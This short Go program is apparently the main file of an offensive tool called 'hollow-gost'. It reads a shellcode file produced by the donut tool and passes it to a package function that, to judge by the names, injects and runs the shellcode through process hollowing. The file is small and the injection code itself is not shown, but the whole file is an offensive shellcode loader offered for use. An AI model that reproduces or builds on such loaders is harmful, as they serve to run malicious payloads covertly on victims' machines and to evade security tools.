package main

import (
	"fmt"
	"io/ioutil"
	"os"

	"github.com/scottctaylor12/hollow-gost/donut"
)

func main() {
	// Read shellcode output file from donut
	// called 'donut' in current directory
	shellcode, err := ioutil.ReadFile("shellcode")

	if err != nil {
		fmt.Println("ERROR: Unable to load shellcode")
		os.Exit(1)
	}

	donut.Start(shellcode)
}